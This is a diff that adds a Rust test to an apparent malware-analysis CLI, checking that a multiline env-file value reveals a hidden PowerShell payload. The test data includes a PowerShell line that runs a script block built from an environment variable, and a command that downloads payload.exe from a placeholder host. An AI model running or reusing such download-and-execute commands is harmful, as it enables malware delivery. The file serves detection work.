@@ -6026,6 +6026,46 @@ fn analyze_env_file_unlocks_powershell_env_payload() {
 }
 
 #[test]
+fn analyze_env_file_accepts_multiline_values() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("child.cmd.txt");
+    let env_file = dir.path().join("sandbox.env");
+    fs::write(
+        &input,
+        r#"powershell -Command "&([scriptblock]::Create($env:HARRINGTON_STAGE))""#,
+    )
+    .expect("write");
+    fs::write(
+        &env_file,
+        "HARRINGTON_STAGE=$u='https://cli-env-multiline.example/payload.exe'\n$ignored = 'kept inside same value'\nInvoke-WebRequest $u -OutFile payload.exe\n",
+    )
+    .expect("write env");
+
+    let out = Command::cargo_bin("harrington")
+        .expect("bin")
+        .args([
+            "analyze",
+            "--env-file",
+            env_file.to_str().expect("env path"),
+            input.to_str().expect("path"),
+        ])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let json: serde_json::Value = serde_json::from_slice(&out).expect("json");
+
+    assert!(
+        json["traits"].as_array().expect("traits").iter().any(|t| t
+            .to_string()
+            .contains("https://cli-env-multiline.example/payload.exe")),
+        "--env-file multiline value did not unlock env-backed PowerShell payload:\n{}",
+        String::from_utf8_lossy(&out)
+    );
+}
+
+#[test]
 fn analyze_env_option_requires_assignment() {
     let dir = TempDir::new().expect("tmp");
     let input = dir.path().join("child.cmd.txt");
